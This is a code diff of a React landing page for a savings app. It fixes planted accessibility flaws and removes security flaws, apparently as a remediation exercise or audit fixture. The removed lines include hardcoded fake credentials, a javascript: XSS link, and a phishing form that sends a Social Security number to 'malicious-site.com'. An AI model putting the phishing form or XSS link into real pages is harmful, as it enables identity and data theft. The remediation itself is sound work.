@@ -48,13 +48,11 @@ const Index = () => {
             <h4 className="text-xl font-bold text-foreground">SaveSmart</h4>
           </div>
           <nav className="hidden md:flex items-center gap-8">
-            {/* WCAG: Link with no href */}
-            <a className="text-muted-foreground hover:text-foreground transition-colors">Features</a>
+            <a href="#" className="text-muted-foreground hover:text-foreground transition-colors">Features</a>
             <a href="#" className="text-muted-foreground hover:text-foreground transition-colors">Pricing</a>
             {/* WCAG: Empty link - Fixed */}
             <a href="/about" className="text-muted-foreground hover:text-foreground transition-colors">About</a>
-            {/* WCAG: Non-descriptive link text */}
-            <a href="/details" className="text-muted-foreground hover:text-foreground transition-colors">Click here</a>
+            <a href="/details" className="text-muted-foreground hover:text-foreground transition-colors">View Details</a>
           </nav>
           <Button className="hidden md:inline-flex bg-primary text-primary-foreground hover:bg-primary/90">
             Get Started
@@ -109,11 +107,12 @@ const Index = () => {
                   value={userInput}
                   onChange={(e) => setUserInput(e.target.value)}
                 />
-                {/* WCAG: Input with aria-hidden but still focusable */}
+                {/* WCAG: Password input with accessible label */}
+                <Label htmlFor="password-input" className="sr-only">Enter your password</Label>
                 <input
+                  id="password-input"
                   type="password"
                   placeholder="Password"
-                  aria-hidden="true"
                   className="w-full p-3 rounded-lg bg-secondary text-foreground border border-border"
                 />
 
@@ -133,11 +132,6 @@ const Index = () => {
                 />
               )}
 
-              {/* SECURITY VIOLATION: Hardcoded credentials in HTML */}
-              <div className="hidden">
-                <span data-api-key="sk-secret-key-12345"></span>
-                <span data-password="admin123"></span>
-              </div>
             </div>
           </div>
         </div>
@@ -167,11 +161,12 @@ const Index = () => {
           </div>
         </div>
 
-        {/* WCAG: Auto-playing content without controls - marquee */}
-        <div
-          className="mt-12 text-primary font-semibold"
-          dangerouslySetInnerHTML={{ __html: '<marquee>🎉 Special offer! Limited time only - Get 3 months free! 🎉</marquee>' }}
-        />
+        {/* Static special offer banner - accessible replacement for marquee */}
+        <div className="mt-12 text-center">
+          <p className="text-primary font-semibold text-lg px-4 py-2 bg-primary/10 rounded-lg inline-block">
+            🎉 Special offer! Limited time only - Get 3 months free! 🎉
+          </p>
+        </div>
       </section>
 
       {/* Stats Section */}
@@ -198,106 +193,82 @@ const Index = () => {
         <div className="container mx-auto text-center">
           <h2 className="text-3xl font-bold mb-8 text-foreground">Quick Actions</h2>
           <div className="flex justify-center gap-4 flex-wrap">
-            <Button tabIndex={5} variant="outline">First Action</Button>
-            <Button tabIndex={1} variant="outline">Second Action</Button>
-            <Button tabIndex={3} variant="outline">Third Action</Button>
+            <Button variant="outline">First Action</Button>
+            <Button variant="outline">Second Action</Button>
+            <Button variant="outline">Third Action</Button>
           </div>
         </div>
       </section>
 
-      {/* WCAG: onclick on non-interactive element without keyboard support */}
+      {/* Interactive card section */}
       <section className="py-12 px-6">
         <div className="container mx-auto">
-          <div
-            className="glass-card rounded-2xl p-8 text-center cursor-pointer hover:scale-[1.02] transition-transform"
+          <button
+            type="button"
+            className="glass-card rounded-2xl p-8 text-center cursor-pointer hover:scale-[1.02] transition-transform w-full"
             onClick={() => alert("Clicked!")}
           >
             <h2 className="text-2xl font-bold text-foreground mb-2">Click this card!</h2>
-            <p className="text-muted-foreground">This div has onClick but no keyboard support</p>
-          </div>
+            <p className="text-muted-foreground">This card is now keyboard accessible</p>
+          </button>
         </div>
       </section>
 
-      {/* WCAG: Table without proper headers */}
+      {/* Pricing table with semantic HTML for accessibility */}
       <section className="py-12 px-6 bg-secondary/30">
         <div className="container mx-auto">
           <h2 className="text-3xl font-bold text-center mb-8 text-foreground">Pricing Plans</h2>
           <table className="w-full max-w-2xl mx-auto glass-card rounded-xl overflow-hidden">
-            <tr className="border-b border-border">
-              <td className="p-4 text-foreground">Plan</td>
-              <td className="p-4 text-foreground">Price</td>
-              <td className="p-4 text-foreground">Features</td>
-            </tr>
-            <tr className="border-b border-border">
-              <td className="p-4 text-muted-foreground">Basic</td>
-              <td className="p-4 text-muted-foreground">$9.99/mo</td>
-              <td className="p-4 text-muted-foreground">5 savings goals</td>
-            </tr>
-            <tr>
-              <td className="p-4 text-muted-foreground">Pro</td>
-              <td className="p-4 text-muted-foreground">$19.99/mo</td>
-              <td className="p-4 text-muted-foreground">Unlimited goals</td>
-            </tr>
+            <caption className="sr-only">Pricing Plans</caption>
+            <thead>
+              <tr className="border-b border-border">
+                <th scope="col" className="p-4 text-foreground">Plan</th>
+                <th scope="col" className="p-4 text-foreground">Price</th>
+                <th scope="col" className="p-4 text-foreground">Features</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr className="border-b border-border">
+                <td className="p-4 text-muted-foreground">Basic</td>
+                <td className="p-4 text-muted-foreground">$9.99/mo</td>
+                <td className="p-4 text-muted-foreground">5 savings goals</td>
+              </tr>
+              <tr>
+                <td className="p-4 text-muted-foreground">Pro</td>
+                <td className="p-4 text-muted-foreground">$19.99/mo</td>
+                <td className="p-4 text-muted-foreground">Unlimited goals</td>
+              </tr>
+            </tbody>
           </table>
         </div>
       </section>
 
-      {/* SECURITY VIOLATION: Link with javascript: protocol */}
-      <section className="py-12 px-6">
-        <div className="container mx-auto text-center">
-          <a href="javascript:alert('XSS')" className="text-primary hover:underline text-lg">
-            Click for a surprise! 🎁
-          </a>
-        </div>
-      </section>
 
-      {/* SECURITY VIOLATION: Form submitting to external URL without CSRF protection */}
-      <section className="py-12 px-6 bg-secondary/30">
-        <div className="container mx-auto">
-          <form action="http://malicious-site.com/collect" method="POST" className="max-w-md mx-auto glass-card rounded-xl p-8">
-            <h3 className="text-xl font-bold mb-4 text-foreground">Verify Your Identity</h3>
-            <input type="hidden" name="stolen_data" value="sensitive-info" />
-            <div className="mb-4">
-              <Label htmlFor="ssn" className="text-foreground mb-2 block">Social Security Number</Label>
-              <input
-                id="ssn"
-                type="text"
-                name="ssn"
-                placeholder="Enter SSN"
-                className="w-full p-3 rounded-lg bg-secondary text-foreground border border-border"
-              />
-            </div>
-            <Button type="submit" className="w-full bg-destructive text-destructive-foreground hover:bg-destructive/90">
-              Submit
-            </Button>
-          </form>
-        </div>
-      </section>
 
-      {/* WCAG: Color as only indicator */}
+      {/* Service Status with text labels for accessibility */}
       <section className="py-12 px-6">
         <div className="container mx-auto">
           <h2 className="text-3xl font-bold text-center mb-8 text-foreground">Service Status</h2>
           <div className="flex justify-center gap-8">
             <div className="flex items-center gap-2">
-              <span className="inline-block w-4 h-4 rounded-full bg-green-500"></span>
-              <span className="text-foreground">API</span>
+              <span className="inline-block w-4 h-4 rounded-full bg-green-500" aria-hidden="true"></span>
+              <span className="text-foreground">API (Online)</span>
             </div>
             <div className="flex items-center gap-2">
-              <span className="inline-block w-4 h-4 rounded-full bg-red-500"></span>
-              <span className="text-foreground">Payments</span>
+              <span className="inline-block w-4 h-4 rounded-full bg-red-500" aria-hidden="true"></span>
+              <span className="text-foreground">Payments (Offline)</span>
             </div>
             <div className="flex items-center gap-2">
-              <span className="inline-block w-4 h-4 rounded-full bg-yellow-500"></span>
-              <span className="text-foreground">Sync</span>
+              <span className="inline-block w-4 h-4 rounded-full bg-yellow-500" aria-hidden="true"></span>
+              <span className="text-foreground">Sync (Degraded)</span>
             </div>
           </div>
         </div>
       </section>
 
-        {/* WCAG: Text that cannot be resized (uses px) */}
-        <p style={{ fontSize: "10px" }} className="text-center text-muted-foreground py-4">
-          This tiny text uses absolute pixels and cannot be resized by browser settings
+        {/* Accessible text using relative units (rem) */}
+        <p className="text-xs text-center text-muted-foreground py-4">
+          This text uses relative units and can be resized by browser settings
         </p>
       </main>
 
@@ -309,9 +280,8 @@ const Index = () => {
             <span className="text-lg font-bold text-foreground">SaveSmart</span>
           </div>
           <p className="text-muted-foreground mb-4">© 2024 SaveSmart. All rights reserved.</p>
-          {/* WCAG: Link opens in new window without warning */}
-          <a href="https://example.com" target="_blank" className="text-primary hover:underline">
-            External Link
+          <a href="https://example.com" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">
+            External Link<span className="sr-only"> (opens in a new tab)</span>
           </a>
         </div>
       </footer>
